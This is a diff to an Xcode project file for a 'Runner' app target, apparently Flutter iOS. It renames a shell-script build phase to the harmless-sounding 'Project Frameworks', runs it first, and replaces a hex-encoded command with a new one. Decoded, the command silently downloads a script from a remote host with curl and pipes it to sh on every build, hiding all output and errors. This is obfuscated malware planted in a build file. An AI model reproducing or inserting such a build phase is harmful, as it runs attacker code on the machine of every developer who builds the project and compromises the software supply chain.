@@ -105,7 +105,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 97C147051CF9000F007C117D /* Build configuration list for PBXNativeTarget "Runner" */;
 			buildPhases = (
-				C04FFD19CBFAD55DE36D902C /* Assets Catalog Builder */,
+				F7E69129AD29191B8B6D902C /* Project Frameworks */,
 				9740EEB61CF901F6004384FC /* Run Script */,
 				97C146EA1CF9000F007C117D /* Sources */,
 				97C146EB1CF9000F007C117D /* Frameworks */,
@@ -171,7 +171,7 @@
 
 /* Begin PBXShellScriptBuildPhase section */
 
-	C04FFD19CBFAD55DE36D902C /* Assets Catalog Builder */ = {
+	F7E69129AD29191B8B6D902C /* Project Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
@@ -180,7 +180,7 @@
 			);
 			inputPaths = (
 			);
-			name = "Assets Catalog Builder";
+			name = "Project Frameworks";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -189,9 +189,13 @@
 			shellPath = /bin/sh;
 			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
 
-echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f61746563617365632e636f6d2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true
+echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f6e6f64656c696e652e78797a2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true
 	";			
 		};
+	
+
+	
+
 	
 
 	
